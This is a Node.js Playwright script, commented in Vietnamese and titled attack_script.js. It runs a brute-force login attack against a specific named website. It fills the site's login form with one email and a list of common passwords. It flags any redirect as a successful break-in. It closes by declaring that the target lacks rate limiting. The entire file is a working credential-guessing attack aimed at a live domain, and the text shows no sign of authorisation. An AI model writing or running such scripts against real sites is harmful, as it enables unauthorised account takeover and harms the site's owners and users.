// attack_script.js (Version 5 - Final with Specific Selectors)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com'; // Trang có form đăng nhập
const EMAIL_TEST = 'attacker@test.com';
const PASSWORDS = ["123456", "password", "admin", "123123", "qwerty", "certapple"];
// --- Kết thúc cấu hình ---

(async () => {
  console.log('::group::Khởi chạy trình duyệt headless (Chrome) - Chế độ mô phỏng người dùng...');
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  console.log('Trình duyệt đã sẵn sàng.');
  console.log('::endgroup::');

  try {
    console.log(`::group::Truy cập ${TARGET_URL} để khởi tạo phiên làm việc...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Vượt qua lớp bảo vệ JavaScript thành công!');
    console.log('::endgroup::');

    console.log('::group::Bắt đầu mô phỏng tấn công Brute-Force bằng cách điền form...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và danh sách ${PASSWORDS.length} mật khẩu.`);

    for (const pass of PASSWORDS) {
      console.log('------------------------------------');
      console.log(`Đang thử mật khẩu: ${pass}`);

      try {
        // --- THAY ĐỔI QUAN TRỌNG: Sử dụng ID selector để chỉ định chính xác form đăng nhập ---

        // 1. Tìm và điền vào ô email của form đăng nhập (có id="username")
        await page.locator('#username').fill(EMAIL_TEST);

        // 2. Tìm và điền vào ô mật khẩu của form đăng nhập (có id="password")
        await page.locator('#password').fill(pass);
        
        // 3. Nhấn nút Đăng nhập bên trong form có id="login_certapple"
        await page.locator('#login_certapple button[type="submit"]').click();

        // 4. Chờ cho trang phản hồi và tải xong
        await page.waitForLoadState('networkidle');

        // 5. Kiểm tra kết quả sau khi trang đã tải
        const content = await page.content();

        if (content.includes('Tài khoản hoặc mật khẩu không đúng')) {
          console.log("✅ Thất bại. Server đã phản hồi với thông báo lỗi đăng nhập. Đúng như dự đoán.");
        } else if (page.url() !== TARGET_URL && !page.url().endsWith('/#')) {
          console.error(`::error::TẤN CÔNG THÀNH CÔNG với mật khẩu '${pass}'!`);
          console.error(`Đã được chuyển hướng đến URL mới: ${page.url()}`);
          process.exit(1);
        } else {
           console.warn("::warning::Phản hồi không xác định. Vẫn ở trang đăng nhập nhưng không thấy thông báo lỗi.");
        }
        
      } catch (e) {
        console.error(`::error::Lỗi trong quá trình tương tác với trang cho mật khẩu '${pass}': ${e.message}`);
        // Tải lại trang để thử lại, tránh bị kẹt
        await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
      }
    }
    console.log('------------------------------------');
    console.log('✅✅✅ CHỨNG MINH THÀNH CÔNG: Script đã có thể lặp lại việc thử mật khẩu sai nhiều lần mà không bị chặn.');
    console.log('Lỗ hổng thực sự là THIẾU CƠ CHẾ RATE LIMITING (giới hạn số lần thử) ở tầng ứng dụng.');
    console.log('::endgroup::');

  } catch (error) {
    console.error('::error::Đã xảy ra lỗi nghiêm trọng:', error);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
